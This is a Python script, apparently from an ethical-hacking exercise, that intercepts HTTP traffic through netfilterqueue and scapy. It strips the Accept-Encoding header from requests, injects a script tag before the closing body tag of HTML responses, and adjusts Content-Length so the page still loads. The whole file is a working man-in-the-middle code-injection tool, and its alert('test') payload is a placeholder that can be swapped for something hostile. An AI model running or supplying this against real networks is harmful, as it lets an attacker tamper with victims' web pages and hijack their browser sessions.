#!/user/bin/env python

import netfilterqueue
import scapy.all as scapy
import re



def set_load(scapy_packet,new_load):
    scapy_packet[scapy.Raw].load = new_load
    del scapy_packet[scapy.IP].chksum
    del scapy_packet[scapy.TCP].chksum
    del scapy_packet[scapy.IP].len
    return scapy_packet


def queue_process(packet):
    scapy_packet=scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load=scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport==80 :
            print('[+] HTTP REQUEST')
            load=re.sub("Accept-Encoding:.*?\\r\\n",'',load)
            print(scapy_packet.show())


        elif scapy_packet[scapy.TCP].sport==80 :
            print('[+] HTTP RESPOUNSE')
            print(scapy_packet.show())
            injection_code="<script>alert('test');</script>"
            content_length_search=re.search('(?:Content-Length:\s)(\d*)',load)
            if content_length_search and 'text/html' in load:
                content_length=content_length_search.group(1)
                new_content_length=int(content_length)+len(injection_code)
                print(content_length)
                print(new_content_length)
                load=load.replace(content_length,str(new_content_length))

            load=load.replace('</body>',injection_code+"</body>")

        if load != scapy_packet[scapy.Raw].load:
            new_scapy_packet=set_load(scapy_packet, load)
            packet.set_payload(str(new_scapy_packet))


    packet.accept()



queue=netfilterqueue.NetfilterQueue()
queue.bind(0,queue_process)
queue.run()